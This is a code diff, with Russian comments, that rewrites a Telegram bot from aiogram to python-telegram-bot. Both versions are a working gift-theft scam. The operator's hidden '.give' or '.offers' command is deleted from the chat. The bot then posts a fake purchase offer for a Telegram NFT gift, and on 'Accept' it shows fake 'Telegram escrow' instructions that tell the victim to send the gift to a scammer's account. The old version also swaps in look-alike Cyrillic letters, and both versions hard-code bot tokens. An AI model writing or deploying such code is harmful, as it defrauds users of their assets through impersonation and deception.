@@ -1,316 +1,150 @@
-import asyncio
 import logging
-import random
-import re
-import string
-import uuid
+import asyncio
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters, CallbackQueryHandler
+from telegram.constants import ParseMode
 
-from aiogram import Bot, Dispatcher, F
-from aiogram.client.default import DefaultBotProperties
-from aiogram.types import (
-    Message,
-    CallbackQuery,
-    BusinessConnection,
-    InlineKeyboardMarkup,
-    InlineKeyboardButton,
+# Вставьте сюда токен вашего бота
+TOKEN = '8850969557:AAF7ISM1vYIyqji6MGNMOfvImFWXG3S5pic'
+
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
 )
-from aiogram.enums import ParseMode
 
-BOT_TOKEN = "8935241046:AAHpWDJR4dgz1e37lSMfGQ6TDAll1k1Fhpo"
-
-EMOJI_STARS = "5920433463428650761"
-EMOJI_GRAM = "5267445215773367585"
-EMOJI_DECLINE_EN = "5774077015388852135"
-EMOJI_ACCEPT = "5774022692642492953"
-
-BUYER_USERNAME = "godmalte"
-
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
-
-bot = Bot(
-    token=BOT_TOKEN,
-    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
-)
-dp = Dispatcher()
-
-business_owner_ids: dict[str, int] = {}
-offers: dict[str, dict] = {}
-
-
-@dp.business_connection()
-async def handle_business_connection(connection: BusinessConnection) -> None:
-    business_owner_ids[connection.id] = connection.user.id
-    logger.info(f"BC: owner={connection.user.id}, id={connection.id}")
-
-
-def parse_nft_link(link: str):
-    pattern = r"(?:https?://)?t\.me/nft/([A-Za-z]+)-(\d+)"
-    m = re.search(pattern, link)
-    if not m:
-        return None
-    slug = m.group(1)
-    number = m.group(2)
-    name = re.sub(r"(?<=[a-z])(?=[A-Z])", " ", slug)
-    full_link = f"https://t.me/nft/{slug}-{number}"
-    return full_link, name, number
-
-
-def parse_offer_command(text: str):
-    parts = text.strip().split()
-    if len(parts) < 3 or parts[0].lower() != ".offers":
-        return None
-    link = parts[1]
-    amount = parts[2]
-    if not amount.isdigit():
-        return None
-
-    currency = "stars"
-    if len(parts) > 3:
-        p3 = parts[3].lower()
-        if p3 in ("stars", "gram"):
-            currency = p3
-
-    parsed = parse_nft_link(link)
-    if not parsed:
-        return None
-    full_link, gift_name, gift_number = parsed
-
-    return {
-        "link": full_link,
-        "gift_name": gift_name,
-        "gift_number": gift_number,
-        "amount": amount,
-        "currency": currency,
-    }
-
-
-async def send_with_fallback(bc_id, chat_id, text, reply_markup):
+# --- Обработчик команды .give ---
+async def give_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # 1. Ждем 1 секунду и удаляем сообщение пользователя
+    await asyncio.sleep(1)
     try:
-        return await bot.send_message(
-            chat_id=chat_id,
-            text=text,
-            reply_markup=reply_markup,
-            business_connection_id=bc_id,
-        )
+        await update.message.delete()
     except Exception as e:
-        logger.warning(f"send with emoji failed: {e}, retry without")
-        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
-        if reply_markup:
-            for row in reply_markup.inline_keyboard:
-                for btn in row:
-                    btn.icon_custom_emoji_id = None
-        return await bot.send_message(
-            chat_id=chat_id,
-            text=clean_text,
-            reply_markup=reply_markup,
-            business_connection_id=bc_id,
-        )
+        logging.error(f"Ошибка удаления сообщения: {e}")
 
+    # 2. Ждем еще 4 секунды (итого 5 секунд с момента отправки команды)
+    await asyncio.sleep(4)
 
-async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
-    try:
-        await bot.edit_message_text(
-            business_connection_id=bc_id,
-            chat_id=chat_id,
-            message_id=message_id,
-            text=text,
-            reply_markup=reply_markup,
-        )
-        logger.info("edit OK")
-        return True
-    except Exception as e:
-        logger.warning(f"edit with emoji failed: {e}, retry without")
-        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
-        if reply_markup:
-            for row in reply_markup.inline_keyboard:
-                for btn in row:
-                    btn.icon_custom_emoji_id = None
-        try:
-            await bot.edit_message_text(
-                business_connection_id=bc_id,
-                chat_id=chat_id,
-                message_id=message_id,
-                text=clean_text,
-                reply_markup=reply_markup,
-            )
-            return True
-        except Exception as e2:
-            logger.error(f"edit fallback failed: {e2}")
-            return False
-
-
-@dp.business_message(F.text.startswith(".offers"))
-async def handle_offer(message: Message) -> None:
-    if not message.business_connection_id:
+    # Парсим команду: .give t.me/nft/ResistanceDog-703 2000 gram
+    text = update.message.text
+    parts = text.split()
+    
+    if len(parts) < 4:
         return
 
-    bc_id = message.business_connection_id
-    data = parse_offer_command(message.text)
-    if not data:
-        return
+    link = parts[1]  # t.me/nft/ResistanceDog-703
+    amount = parts[2]  # 2000
+    
+    # Извлекаем название подарка из ссылки (ResistanceDog-703)
+    gift_name = link.split('/')[-1] 
 
-    try:
-        await bot.delete_business_messages(
-            business_connection_id=bc_id,
-            message_ids=[message.message_id],
-        )
-        logger.info("команда офферс удалена")
-    except Exception as e:
-        logger.warning(f"delete failed: {e}")
+    # Получаем имя пользователя (ник)
+    user_name = update.effective_user.first_name or "User"
 
-    await asyncio.sleep(3)
-
-    amount_fmt = f"{int(data['amount']):,}"
-    number_fmt = f"{int(data['gift_number']):,}"
-
-    if data["currency"] == "gram":
-        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
-        currency_word = "GRАM"
-    else:
-        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
-        currency_word = "Stаrs"
-
-    gift_display = f'<a href="{data["link"]}"><b>{data["gift_name"]} #{number_fmt}</b></a>'
-
-    text = (
-        f"Thе usеr is оffеring yоu\n"
-        f"<b>{amount_fmt} {currency_word}</b> {emoji} "
-        f"fоr thе gift {gift_display}.\n\n"
-        f"Thе оffеr is vаlid fоr аnоthеr <b>6 h. 0 min</b>.."
+    # Формируем текст с HTML-разметкой
+    # Эмодзи ID: 5264766603584641330 (💎)
+    emoji_gram = '<tg-emoji emoji-id="5264766603584641330">💎</tg-emoji>'
+    
+    offer_text = (
+        f"User <b>{user_name}</b> offers you <b>{amount}</b> {emoji_gram} <b>GRAM</b> "
+        f"for the gift <b><a href=\"{link}\">{gift_name}</a></b>.\n\n"
+        f"The offer is valid for 6 h. 0 min.."
     )
 
-    offer_id = uuid.uuid4().hex[:12]
-    offers[offer_id] = {
-        **data,
-        "bc_id": bc_id,
-        "chat_id": message.chat.id,
-        "accepted": False,
-    }
-
-    keyboard = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(
-                    text="Decline",
-                    callback_data=f"dec:{offer_id}",
-                    icon_custom_emoji_id=EMOJI_DECLINE_EN,
-                ),
-                InlineKeyboardButton(
-                    text="Accept",
-                    callback_data=f"acc:{offer_id}",
-                    icon_custom_emoji_id=EMOJI_ACCEPT,
-                ),
-            ]
+    # Инлайн-кнопки (используем ID из вашего запроса как callback_data)
+    keyboard = [
+        [
+            InlineKeyboardButton("5774022692642492953 Accept", callback_data="5774022692642492953"),
+            InlineKeyboardButton("5774077015388852135 Decline", callback_data="5774077015388852135")
         ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    # Отправляем сообщение от имени бизнес-аккаунта
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text=offer_text,
+        parse_mode=ParseMode.HTML,
+        reply_markup=reply_markup
     )
 
-    try:
-        sent = await send_with_fallback(
-            bc_id=bc_id,
-            chat_id=message.chat.id,
-            text=text,
-            reply_markup=keyboard,
+# --- Обработчик нажатий на кнопки ---
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    data = query.data
+
+    # --- ВЕТКА DECLINE ---
+    if data == "5774077015388852135":
+        await query.answer() # Убираем "часики" загрузки
+        await asyncio.sleep(1) # Ждем 1 секунду
+        
+        emoji_decline = '<tg-emoji emoji-id="5774077015388852135">🚫</tg-emoji>'
+        
+        await query.edit_message_text(
+            text=f"{emoji_decline} Offer has been declined.",
+            parse_mode=ParseMode.HTML
         )
-        offers[offer_id]["msg_id"] = sent.message_id
-        logger.info(f"Оффер {offer_id} отправлен в чат {message.chat.id}")
-    except Exception as e:
-        logger.error(f"send failed: {e}")
 
+    # --- ВЕТКА ACCEPT ---
+    elif data == "5774022692642492953":
+        
+        # 1. Показываем всплывающее окно (Callback Answer)
+        # Текст взят со скрина, @offersrelay заменен на @togethmode
+        # В answerCallbackQuery нельзя использовать HTML, только обычный текст
+        popup_text = (
+            "NFT Deal\n"
+            "@togethmode\n\n"
+            "Attention!\n\n"
+            "Follow the instructions to avoid losing the gift and receive payment.\n\n"
+            "Click «OK» if you have read this message."
+        )
+        await query.answer(text=popup_text, show_alert=True)
 
-@dp.callback_query(F.data.startswith("dec:"))
-async def handle_decline(callback: CallbackQuery) -> None:
-    _, offer_id = callback.data.split(":", 1)
-    data = offers.get(offer_id)
-    if not data or data.get("accepted"):
-        return
+        # 2. Ждем 1 секунду и меняем текст сообщения на NFT Deal
+        await asyncio.sleep(1)
+        
+        # В реальном боте лучше сохранять gift_name в context.user_data при создании сообщения,
+        # но для простоты примера вытащим его из текста или зададим жестко.
+        gift_name = "ResistanceDog-703"
+        amount = "2000"
+        emoji_gram = '<tg-emoji emoji-id="5264766603584641330">💎</tg-emoji>'
 
-    decline_text = (
-        f'<tg-emoji emoji-id="{EMOJI_DECLINE_EN}">❌</tg-emoji> '
-        f"Offer has been declined."
-    )
+        deal_text = (
+            f"<b>NFT Deal</b>\n\n"
+            f"<b>Order #TG-AC3UY0FB</b>\n\n"
+            f"The buyer has reserved <b>{amount}</b> {emoji_gram} <b>GRAM</b> through the Telegram escrow system. "
+            f"The funds are held in a special escrow account and will be automatically credited to your GRAM in Telegram balance right after the gift is transferred.\n\n"
+            f"<b>Instructions to complete the deal:</b>\n\n"
+            f"1. Send to: @togethmode\n"
+            f"2. Click «Send Gift» and select {gift_name}\n"
+            f"3. Confirm the gift transfer.\n\n"
+            f"Telegram will record the transaction and instantly credit <b>{amount}</b> {emoji_gram} <b>GRAM</b> to your balance. "
+            f"The reservation is valid for 24 hours."
+        )
 
-    await edit_with_fallback(
-        bc_id=data["bc_id"],
-        chat_id=data["chat_id"],
-        message_id=data["msg_id"],
-        text=decline_text,
-    )
-
-    try:
-        await callback.answer()
-    except Exception:
-        pass
-
-
-@dp.callback_query(F.data.startswith("acc:"))
-async def handle_accept(callback: CallbackQuery) -> None:
-    _, offer_id = callback.data.split(":", 1)
-    data = offers.get(offer_id)
-    if not data or data.get("accepted"):
-        return
-
-    data["accepted"] = True
-
-    number_fmt = f"{int(data['gift_number']):,}"
-
-    if data["currency"] == "gram":
-        currency_word = "GRАM"
-    else:
-        currency_word = "Ѕtarѕ"
-
-    gift_display = f'<a href="{data["link"]}"><b>{data["gift_name"]} #{number_fmt}</b></a>'
-
-    accept_text = (
-        f'Gіft {gift_display} '
-        f"haѕ been ѕucceѕѕfully ѕοld!\n\n"
-        f"<b>• Τranѕfer the gіft tο the buyer tο receіve yοur {currency_word}.</b>"
-    )
-
-    keyboard = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(
-                    text="Transfer gift",
-                    url=f"tg://send_gift?to={BUYER_USERNAME}",
-                )
-            ],
-            [
-                InlineKeyboardButton(
-                    text="Confirm transfer",
-                    callback_data="confirm_transfer",
-                    icon_custom_emoji_id=EMOJI_ACCEPT,
-                )
-            ],
+        # Кнопка с прямой ссылкой на отправку подарка
+        keyboard = [
+            [InlineKeyboardButton("Send gift", url="tg://send_gift?to=togethmode")]
         ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        await query.edit_message_text(
+            text=deal_text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=reply_markup
+        )
+
+if __name__ == '__main__':
+    application = ApplicationBuilder().token(TOKEN).build()
+
+    # Регулярное выражение для отлова команды .give t.me/nft/... 2000 gram
+    give_handler = MessageHandler(
+        filters.Regex(r'^\.give\s+t\.me/nft/\S+\s+\d+\s+gram$'), 
+        give_command
     )
+    application.add_handler(give_handler)
 
-    await edit_with_fallback(
-        bc_id=data["bc_id"],
-        chat_id=data["chat_id"],
-        message_id=data["msg_id"],
-        text=accept_text,
-        reply_markup=keyboard,
-    )
+    # Обработчик инлайн-кнопок
+    application.add_handler(CallbackQueryHandler(button_callback))
 
-    try:
-        await callback.answer()
-    except Exception:
-        pass
-
-
-@dp.callback_query(F.data == "confirm_transfer")
-async def handle_confirm_transfer(callback: CallbackQuery) -> None:
-    try:
-        await callback.answer()
-    except Exception:
-        pass
-
-
-async def main() -> None:
-    logger.info("бот запущен")
-    await dp.start_polling(bot)
-
-
-if __name__ == "__main__":
-    asyncio.run(main())
+    print("Бот запущен...")
+    application.run_polling()
